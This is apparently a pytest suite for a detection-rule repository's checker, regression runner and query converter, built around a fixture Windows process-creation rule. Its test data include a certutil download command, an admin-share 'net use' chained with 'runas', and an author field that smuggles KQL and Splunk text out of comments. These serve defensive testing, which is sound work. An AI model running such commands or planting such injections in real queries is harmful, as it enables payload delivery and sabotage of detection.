"""End-to-end tests of check_rules, regression_tests_runner and convert_rules on a temp repo."""

import json
import shutil
from pathlib import Path

import pytest

import check_rules
import convert_rules
import regression_tests_runner
from repo import ROOT

RULE_ID = "6a1f3b2c-9d4e-4f8a-b7c6-5e4d3c2b1a09"
RULE_PATH = "rules/windows/process_creation/proc_creation_win_hauslab_fixture_child.yml"
DATA_DIR = "regression_data/rules/windows/process_creation/proc_creation_win_hauslab_fixture_child"

RULE = f"""\
title: Suspicious Child Process Of Hauslab Fixture Binary
id: {RULE_ID}
status: {{status}}
description: Detects a test fixture binary spawning cmd.exe. It exists only to exercise the repository tooling.
references:
    - https://example.com/fixture
author: hauslab
date: 2026-10-05
tags:
    - attack.execution
    - attack.t1059.003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\\hauslab_fixture.exe'
        Image|endswith: '\\cmd.exe'
{{extra}}    condition: selection
falsepositives:
    - Unlikely
level: high
regression_tests_path: {DATA_DIR}/info.yml
simulation:
    - type: atomic-red-team
      name: Fixture atomic
      technique: T1059.003
      atomic_guid: 00000000-0000-4000-8000-000000000000
"""

INFO = f"""\
id: 1b2c3d4e-5f60-4718-9a0b-c1d2e3f40516
description: Fixture tests
date: 2026-10-05
author: hauslab
rule_metadata:
    - id: {RULE_ID}
      title: Suspicious Child Process Of Hauslab Fixture Binary
regression_tests_info:
    - name: Positive Detection Test
      type: jsonl
      match_count: 1
      path: {DATA_DIR}/{RULE_ID}.jsonl
    - name: Benign Look-alike Test
      type: jsonl
      match_count: 0
      path: {DATA_DIR}/{RULE_ID}_benign.jsonl
"""

TRUE_POSITIVE = {
    "EventID": 1,
    "Computer": "ws01.hauslab.local",
    "User": "HAUSLAB\\labuser",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ParentImage": "C:\\Tools\\hauslab_fixture.exe",
    "IntegrityLevel": "High",
}
BENIGN = {**TRUE_POSITIVE, "ParentImage": "C:\\Windows\\explorer.exe"}
# Account values that public-repo hygiene allows.
HAUSLAB_ACCOUNTS = {
    **TRUE_POSITIVE,
    "User": "NT AUTHORITY\\SYSTEM",
    "SubjectDomainName": "HAUSLAB",
    "TenantId": "00000000-0000-0000-0000-000000000000",
    "CommandLine": "net use \\\\ws02.hauslab.local\\C$ /u:ws02\\Administrator & runas /user:%userdomain%\\%username% cmd.exe",
}


def make_repo(root: Path, status: str = "experimental", extra: str = "", validated: str = "") -> Path:
    shutil.copytree(ROOT / "pipelines", root / "pipelines")
    rule = root / RULE_PATH
    rule.parent.mkdir(parents=True)
    rule.write_text(RULE.format(status=status, extra=extra), encoding="utf-8")
    data = root / DATA_DIR
    data.mkdir(parents=True)
    (data / "info.yml").write_text(INFO + validated, encoding="utf-8")
    write_events(data / f"{RULE_ID}.jsonl", TRUE_POSITIVE)
    write_events(data / f"{RULE_ID}_benign.jsonl", BENIGN)
    return root


def write_events(path: Path, *events: dict) -> None:
    path.write_text("".join(json.dumps(event) + "\n" for event in events), encoding="utf-8")


def edit(path: Path, old: str, new: str) -> None:
    text = path.read_text(encoding="utf-8")
    assert old in text
    path.write_text(text.replace(old, new), encoding="utf-8")


def problems(root: Path) -> list[str]:
    return [problem for found in check_rules.run(root).values() for problem in found]


def test_clean_fixture_passes_everything(tmp_path):
    root = make_repo(tmp_path)
    assert check_rules.run(root) == {}
    outcomes = regression_tests_runner.run(root)
    assert [(o.test, o.passed) for o in outcomes] == [("Positive Detection Test", True), ("Benign Look-alike Test", True)]
    results = convert_rules.run(root, out_dir=tmp_path / "build")
    assert [(r.target, r.problem) for r in results] == [("elastic", None), ("kusto", None), ("splunk", None)]
    assert convert_rules.exit_code(results) == 0
    assert "hauslab_fixture.exe" in (tmp_path / "build" / "kusto" / "proc_creation_win_hauslab_fixture_child.kql").read_text()
    assert 'ParentImage="*\\\\hauslab_fixture.exe"' in (tmp_path / "build" / "splunk" / "proc_creation_win_hauslab_fixture_child.spl").read_text()
    elastic_rule = json.loads((tmp_path / "build" / "elastic" / "proc_creation_win_hauslab_fixture_child.ndjson").read_text())
    assert elastic_rule["rule_id"] == RULE_ID
    # EQL's `:` is case-insensitive, so the base ECS fields are queried, not `.caseless`.
    assert (elastic_rule["type"], elastic_rule["language"]) == ("eql", "eql")
    assert elastic_rule["query"] == (
        'any where process.parent.executable:"*\\\\hauslab_fixture.exe" and process.executable:"*\\\\cmd.exe"'
    )


def test_converted_rules_keep_drl_attribution(tmp_path):
    # Elastic rules carry the author as a field; bare Kusto and Splunk queries carry it as comments.
    root = make_repo(tmp_path)
    convert_rules.run(root, out_dir=tmp_path / "build")
    attribution = [
        "title: Suspicious Child Process Of Hauslab Fixture Binary",
        f"id: {RULE_ID}",
        "author: hauslab",
        "license: DRL-1.1 (https://github.com/SigmaHQ/Detection-Rule-License)",
        f"rule: https://github.com/cyberchup/wachhund/blob/main/{RULE_PATH}",
    ]
    build = tmp_path / "build"
    kql = (build / "kusto" / "proc_creation_win_hauslab_fixture_child.kql").read_text().splitlines()
    assert kql[:5] == [f"// {line}" for line in attribution]
    assert kql[5].startswith("DeviceProcessEvents")
    spl = (build / "splunk" / "proc_creation_win_hauslab_fixture_child.spl").read_text().splitlines()
    assert spl[0].startswith('ParentImage="*\\\\hauslab_fixture.exe"')
    assert spl[1:] == [f"```{line}```" for line in attribution]
    elastic_rule = json.loads((build / "elastic" / "proc_creation_win_hauslab_fixture_child.ndjson").read_text())
    assert elastic_rule["author"] == ["hauslab"]


def test_attribution_cant_end_its_comments(tmp_path):
    # A line break ends a Kusto comment and three backticks end a Splunk one. Without the fix,
    # the rest of this author would run as query text and empty the table the query reads.
    root = make_repo(tmp_path)
    edit(root / RULE_PATH, "author: hauslab", 'author: "hauslab\\nlet DeviceProcessEvents = view() { print x=1 | take 0 };```| where 1=0 ```"')
    convert_rules.run(root, out_dir=tmp_path / "build")
    author = "author: hauslab let DeviceProcessEvents = view() { print x=1 | take 0 };| where 1=0"
    build = tmp_path / "build"
    kql = (build / "kusto" / "proc_creation_win_hauslab_fixture_child.kql").read_text().splitlines()
    assert kql[2] == f"// {author}"
    assert [line.startswith("// ") for line in kql[:6]] == [True] * 5 + [False]
    assert kql[5].startswith("DeviceProcessEvents")
    spl = (build / "splunk" / "proc_creation_win_hauslab_fixture_child.spl").read_text().splitlines()
    assert spl[3] == f"```{author}```"
    assert len(spl) == 6 and all(line.count("```") == 2 for line in spl[1:])


def test_benign_event_that_matches_fails_the_run(tmp_path):
    root = make_repo(tmp_path)
    write_events(root / DATA_DIR / f"{RULE_ID}_benign.jsonl", BENIGN, TRUE_POSITIVE)
    failed = [o for o in regression_tests_runner.run(root) if not o.passed]
    assert [o.test for o in failed] == ["Benign Look-alike Test"]
    assert "matching lines: 2" in failed[0].detail


def test_hauslab_capture_in_ecs_format(tmp_path):
    """A document exported from Elastic is tested through the same pipelines as conversion."""
    root = make_repo(tmp_path)
    capture = {
        "@timestamp": "2026-10-12T09:15:02.123Z",
        "host": {"name": "ws01.hauslab.local", "ip": ["10.20.0.15"]},
        "user": {"name": "labuser", "domain": "HAUSLAB"},
        "event": {"code": "1", "category": ["process"]},
        "process": {
            "executable": "C:\\Windows\\System32\\cmd.exe",
            "parent": {"executable": "C:\\Tools\\hauslab_fixture.exe"},
        },
    }
    write_events(root / DATA_DIR / f"{RULE_ID}_hauslab.jsonl", capture)
    with (root / DATA_DIR / "info.yml").open("a", encoding="utf-8") as info:
        info.write(
            "    - name: Positive Detection Test - hauslab capture\n"
            "      type: jsonl\n"
            "      match_count: 1\n"
            f"      path: {DATA_DIR}/{RULE_ID}_hauslab.jsonl\n"
            "      pipelines:\n"
            "          - pipelines/elastic.yml\n"
            "          - ecs_windows\n"
        )
    assert check_rules.run(root) == {}
    assert [o.passed for o in regression_tests_runner.run(root)] == [True, True, True]


def test_evtx_samples_are_rejected(tmp_path):
    root = make_repo(tmp_path)
    (root / DATA_DIR / f"{RULE_ID}.evtx").write_bytes(b"ElfFile\x00")
    info = (root / DATA_DIR / "info.yml").read_text(encoding="utf-8").replace(f"{RULE_ID}.jsonl", f"{RULE_ID}.evtx")
    (root / DATA_DIR / "info.yml").write_text(info.replace("type: jsonl\n      match_count: 1", "type: evtx\n      match_count: 1"), encoding="utf-8")
    assert any("export EVTX events as JSON Lines" in p for p in problems(root))
    failed = [o for o in regression_tests_runner.run(root) if not o.passed]
    assert len(failed) == 1 and "unsupported test type 'evtx'" in failed[0].detail


def test_status_gate(tmp_path):
    validated = "validated:\n    - platform: elastic\n      date: 2026-10-12\n"
    assert any("needs a `validated` entry" in p for p in problems(make_repo(tmp_path / "a", status="test")))
    assert problems(make_repo(tmp_path / "b", status="test", validated=validated)) == []
    assert any("status is experimental" in p for p in problems(make_repo(tmp_path / "c", validated=validated)))


@pytest.mark.parametrize(
    ("change", "expected"),
    [
        (lambda root: (root / DATA_DIR / "info.yml").write_text(INFO.split("    - name: Benign")[0], encoding="utf-8"), "needs a benign test"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "User": "jdoe@clientcorp.com"}), "address at 'clientcorp.com'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "Computer": "fs01.clientcorp.local"}), "internal hostname 'fs01.clientcorp.local'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "SourceIp": "8.8.8.8"}), "public IP '8.8.8.8'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "SourceIp": "192.0.2.10"}), None),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "CommandLine": "certutil -urlcache -f http://8.8.4.4/x.exe"}), "public IP '8.8.4.4'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "FileVersion": "1.0.0.0"}), None),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "CommandLine": "net use Z: \\\\fs01.hauslab.local\\share /user:CLIENTCORP\\jdoe"}), "domain 'CLIENTCORP'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "User": "CLIENTCORP\\jdoe"}), "domain 'CLIENTCORP'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "SubjectDomainName": "CLIENTCORP"}), "domain 'CLIENTCORP'"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", {**TRUE_POSITIVE, "TenantId": "3f2b8c1e-9a4d-4e6f-8b7a-1c2d3e4f5a6b"}), "tenant or subscription ID"),
        (lambda root: write_events(root / DATA_DIR / f"{RULE_ID}.jsonl", HAUSLAB_ACCOUNTS), None),
        (lambda root: edit(root / DATA_DIR / "info.yml", "Fixture tests", "Fixture tests from fs01.clientcorp.local"), "info.yml: internal hostname 'fs01.clientcorp.local'"),
        (lambda root: edit(root / "pipelines/kusto.yml", "name: custom_kusto", "# Seen from 8.8.8.8\nname: custom_kusto"), "public IP '8.8.8.8'"),
        (lambda root: edit(root / RULE_PATH, "author: hauslab", 'author: "hauslab\\nlet x = 1;"'), "`author` must be one line"),
        (lambda root: edit(root / RULE_PATH, "title: Suspicious", "title: Suspicious ```"), "`title` must be one line"),
        (lambda root: (root / RULE_PATH).write_text((root / RULE_PATH).read_text().split("simulation:")[0], encoding="utf-8"), "needs a `simulation` entry"),
        (lambda root: shutil.copy(root / RULE_PATH, root / "rules/windows/process_creation/proc_creation_win_copy.yml"), "duplicate id"),
        (lambda root: (root / "regression_data/rules/orphan").mkdir() or (root / "regression_data/rules/orphan/info.yml").write_text("id: x\n"), "no rule points to this test data"),
    ],
)
def test_check_rules_flags_problems(tmp_path, change, expected):
    root = make_repo(tmp_path)
    change(root)
    found = problems(root)
    if expected is None:
        assert found == []
    else:
        assert any(expected in problem for problem in found), found


def test_rule_in_wrong_product_folder(tmp_path):
    root = make_repo(tmp_path)
    moved = root / "rules/linux/process_creation/proc_creation_win_hauslab_fixture_child.yml"
    moved.parent.mkdir(parents=True)
    (root / RULE_PATH).rename(moved)
    assert any("belong under rules/windows/" in p for p in problems(root))


def test_convert_flags_unmapped_fields_until_mapped(tmp_path):
    root = make_repo(tmp_path, extra="        IntegrityLevel: 'High'\n")
    results = {r.target: r.problem for r in convert_rules.run(root, out_dir=tmp_path / "build")}
    # ecs_windows has no ECS mapping for IntegrityLevel and falls back to winlog.event_data.
    assert results["elastic"] == "unmapped field(s): IntegrityLevel (became winlog.event_data.IntegrityLevel)"
    assert results["kusto"] is None

    (root / "pipelines/elastic.yml").write_text(
        "name: custom_elastic\npriority: 10\ntransformations:\n"
        "    - id: elastic_custom_integrity_level\n      type: field_name_mapping\n"
        "      mapping:\n          IntegrityLevel: winlog.event_data.IntegrityLevel\n",
        encoding="utf-8",
    )
    results = {r.target: r.problem for r in convert_rules.run(root, out_dir=tmp_path / "build")}
    assert results == {"elastic": None, "kusto": None, "splunk": None}


def test_best_effort_target_warns_without_failing(tmp_path):
    root = make_repo(tmp_path)
    targets = root / "pipelines/targets.yml"
    targets.write_text(targets.read_text(encoding="utf-8").replace("splunk_windows]", "no_such_pipeline]"), encoding="utf-8")
    results = convert_rules.run(root, out_dir=tmp_path / "build")
    splunk = next(r for r in results if r.target == "splunk")
    assert splunk.problem and not splunk.required
    assert convert_rules.exit_code(results) == 0
    # The same problem on a required target fails the run.
    targets.write_text(targets.read_text(encoding="utf-8").replace("required: false", "required: true"), encoding="utf-8")
    assert convert_rules.exit_code(convert_rules.run(root, out_dir=tmp_path / "build")) == 1


SECURITY_LOG_DETECTION = """\
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 1102
        Provider_Name: 'Microsoft-Windows-Eventlog'
    condition: selection
"""


def test_security_log_rule_converts_for_both_targets(tmp_path):
    root = make_repo(tmp_path)
    rule = root / RULE_PATH
    text = rule.read_text(encoding="utf-8")
    rule.write_text(text[: text.index("logsource:")] + SECURITY_LOG_DETECTION + text[text.index("falsepositives:") :], encoding="utf-8")
    results = {r.target: r.problem for r in convert_rules.run(root, out_dir=tmp_path / "build")}
    assert results == {"elastic": None, "kusto": None, "splunk": None}
    # ecs_windows adds the channel condition itself; it isn't an unmapped rule field.
    elastic_rule = json.loads((tmp_path / "build" / "elastic" / "proc_creation_win_hauslab_fixture_child.ndjson").read_text())
    assert elastic_rule["query"].startswith('any where winlog.channel:"Security" and')
    # azure_monitor picks no table for `service: security`; pipelines/kusto.yml sets SecurityEvent.
    kql = (tmp_path / "build" / "kusto" / "proc_creation_win_hauslab_fixture_child.kql").read_text()
    query = [line for line in kql.splitlines() if not line.startswith("//")]
    assert query[0] == "SecurityEvent"
    assert 'EventSourceName =~ "Microsoft-Windows-Eventlog"' in kql


def test_convert_flags_fields_the_kusto_table_lacks(tmp_path):
    root = make_repo(tmp_path, extra="        TotallyMadeUpField: 'x'\n")
    results = {r.target: r.problem for r in convert_rules.run(root, out_dir=tmp_path / "build")}
    assert results["kusto"] == "unmapped field: TotallyMadeUpField is not a column of DeviceProcessEvents"
    assert results["elastic"] == "unmapped field(s): TotallyMadeUpField (became winlog.event_data.TotallyMadeUpField)"


@pytest.mark.parametrize(
    "extra, target, expected",
    [
        # EQL runs regex as an anchored Lucene regexp.
        ("        CommandLine|re: 'a.*b'\n", "elastic", "CommandLine 'a.*b' (regex)"),
        # Kusto turns these into a case-sensitive regex, or separate contains checks.
        ("        CommandLine|contains: '/user:* *'\n", "kusto", "CommandLine '*/user:* *' (inner wildcard)"),
        ("        CommandLine|startswith: 'ab?'\n", "kusto", "CommandLine 'ab?*' (inner wildcard)"),
    ],
)
def test_convert_flags_values_a_target_would_match_differently(tmp_path, extra, target, expected):
    root = make_repo(tmp_path, extra=extra)
    results = {r.target: r.problem for r in convert_rules.run(root, out_dir=tmp_path / "build")}
    assert results == {**dict.fromkeys(results), target: f"query would match differently from the rule: {expected}"}


@pytest.mark.parametrize(
    "extra",
    [
        "        CommandLine|windash|contains: '-quiet'\n",
        # The trailing * is redundant; Kusto still converts it to a plain `contains`.
        "        CommandLine|contains: 'abc*'\n",
    ],
)
def test_convert_accepts_wildcards_at_the_ends_of_a_value(tmp_path, extra):
    root = make_repo(tmp_path, extra=extra)
    results = {r.target: r.problem for r in convert_rules.run(root, out_dir=tmp_path / "build")}
    assert results == {"elastic": None, "kusto": None, "splunk": None}
